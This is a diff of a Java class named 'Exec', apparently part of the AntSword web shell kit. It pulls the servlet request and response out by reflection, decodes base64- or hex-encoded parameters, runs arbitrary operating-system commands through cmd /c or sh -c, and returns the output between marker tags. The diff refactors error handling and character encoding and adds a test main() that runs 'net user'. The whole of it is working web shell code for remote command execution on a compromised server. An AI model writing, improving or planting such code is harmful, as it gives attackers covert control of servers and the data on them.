@@ -1,3 +1,5 @@
+package command;
+
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 import java.io.BufferedReader;
@@ -21,7 +23,7 @@ public class Exec {
             Class clazz = Class.forName("javax.servlet.jsp.PageContext");
             request = (HttpServletRequest) clazz.getDeclaredMethod("getRequest").invoke(obj);
             response = (HttpServletResponse) clazz.getDeclaredMethod("getResponse").invoke(obj);
-        } catch (Exception ex) {
+        } catch (Exception e) {
             if (obj instanceof HttpServletRequest) {
                 request = (HttpServletRequest) obj;
                 try {
@@ -31,21 +33,12 @@ public class Exec {
                     Field resp = request2.getClass().getDeclaredField("response");
                     resp.setAccessible(true);
                     response = (HttpServletResponse) resp.get(request2);
-                } catch (Exception e) {
-                    e.printStackTrace();
-                }
+                } catch (Exception ex) {
+                    try {
+                        response = (HttpServletResponse) request.getClass().getDeclaredMethod("getResponse").invoke(obj);
+                    } catch (Exception ignored) {
 
-            } else if (obj instanceof HttpServletResponse) {
-                response = (HttpServletResponse) obj;
-                try {
-                    Field resp = response.getClass().getDeclaredField("response");
-                    resp.setAccessible(true);
-                    HttpServletResponse response2 = (HttpServletResponse) resp.get(response);
-                    Field req = response2.getClass().getDeclaredField("request");
-                    req.setAccessible(true);
-                    request = (HttpServletRequest) req.get(response2);
-                } catch (Exception e) {
-                    e.printStackTrace();
+                    }
                 }
             }
         }
@@ -53,7 +46,6 @@ public class Exec {
         encoder = "base64";
         cs = "antswordCharset";
         StringBuffer output = new StringBuffer("");
-        StringBuffer sb = new StringBuffer("");
         String tag_s = "->|";
         String tag_e = "|<-";
         String varkey1 = "antswordargbin";
@@ -63,23 +55,25 @@ public class Exec {
             response.setContentType("text/html");
             request.setCharacterEncoding(cs);
             response.setCharacterEncoding(cs);
-            String z1 = EC(decode(request.getParameter(varkey1) + ""));
-            String z2 = EC(decode(request.getParameter(varkey2) + ""));
-            String z3 = EC(decode(request.getParameter(varkey3) + ""));
-            output.append(tag_s);
-            sb.append(ExecuteCommandCode(z1, z2, z3));
-            output.append(sb.toString());
-            output.append(tag_e);
-            response.getWriter().print(output.toString());
+            String z1 = decode(request.getParameter(varkey1));
+            String z2 = decode(request.getParameter(varkey2));
+            String z3 = decode(request.getParameter(varkey3));
+            output.append(ExecuteCommandCode(z1, z2, z3));
         } catch (Exception e) {
-            sb.append("ERROR" + ":// " + e.toString());
+            output.append("ERROR:// " + e.toString());
+        }
+        try {
+            response.getWriter().print(tag_s + output.toString() + tag_e);
+        } catch (Exception ignored) {
         }
         return true;
     }
 
-    String EC(String s) throws Exception {
-        if (encoder.equals("hex")) return s;
-        return new String(s.getBytes(), cs);
+    public static void main(String[] args) throws Exception {
+        Exec exec = new Exec();
+        exec.cs = "GBK";
+        String result = exec.ExecuteCommandCode("cmd", "net user", "");
+        System.out.println(result);
     }
 
     String decode(String str) throws Exception {
@@ -102,7 +96,7 @@ public class Exec {
                 ss = ss + (hexString.indexOf(str.charAt(i)) << 4 | hexString.indexOf(str.charAt(i + 1))) + ",";
                 baos.write((hexString.indexOf(str.charAt(i)) << 4 | hexString.indexOf(str.charAt(i + 1))));
             }
-            return baos.toString("UTF-8");
+            return baos.toString(cs);
         } else if (encoder.equals("base64")) {
             byte[] bt = null;
             try {
@@ -113,16 +107,16 @@ public class Exec {
                 Object decoder = clazz.getMethod("getDecoder").invoke(null);
                 bt = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
             }
-            return new String(bt, "UTF-8");
+            return new String(bt, cs);
         }
         return str;
     }
 
-    String ExecuteCommandCode(String cmdPath, String command, String envstr) throws Exception {
+    public String ExecuteCommandCode(String cmdPath, String command, String envstr) throws Exception {
         StringBuffer sb = new StringBuffer("");
         String[] c = {cmdPath, !isWin() ? "-c" : "/c", command};
         Map<String, String> readonlyenv = System.getenv();
-        Map<String, String> cmdenv = new HashMap<>(readonlyenv);
+        Map<String, String> cmdenv = new HashMap<String, String>(readonlyenv);
         String[] envs = envstr.split("\\|\\|\\|asline\\|\\|\\|");
         for (int i = 0; i < envs.length; i++) {
             String[] es = envs[i].split("\\|\\|\\|askey\\|\\|\\|");
